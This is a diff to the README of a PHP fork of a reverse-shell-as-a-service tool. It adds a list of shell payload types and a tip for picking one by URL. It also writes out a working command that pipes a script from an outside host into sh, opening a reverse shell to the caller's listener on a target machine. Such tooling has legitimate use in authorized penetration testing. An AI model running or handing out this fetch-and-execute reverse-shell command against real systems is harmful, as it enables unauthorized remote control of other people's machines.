@@ -8,7 +8,22 @@ Detects available software on the target and runs an appropriate payload.
 
 This is a fork from [lukechilds' version](https://github.com/lukechilds/reverse-shell), which was made in NodeJS.
 
-I made this in PHP and added more payloads. I'll probably add more functions in the future.
+I made this in PHP, added more payloads and the function to use a specific payload.
+
+### Payloads
+
+
+- PHP, PHP2, PHP3, PHP4, PHP5, PHP6, PHP7, PHP8
+- Python, python2, python3, python4
+- Perl, perl2
+- Socat, socat2
+- Ruby, ruby2
+- Bash, bash2
+- Ncat, ncat2
+- Telnet
+- Awk
+- Sh
+- Go
 
 ## Usage
 
@@ -35,6 +50,17 @@ Go back to your machine, you should now have a shell prompt.
 
 
 ## Tips
+
+### Use a specific shell
+
+Sometimes you may prefer some payload instead of another. In these cases, you can use https://r.0x7359.com/yourip:port:payload_name to choose the payload you want.
+
+The names of the payloads are inside brackets before the payloads themselves.
+
+E.g.: 
+```shell
+curl https://r.0x7359.com/192.168.0.69:1337:php4 | sh &
+```
 
 ### Hostname
 
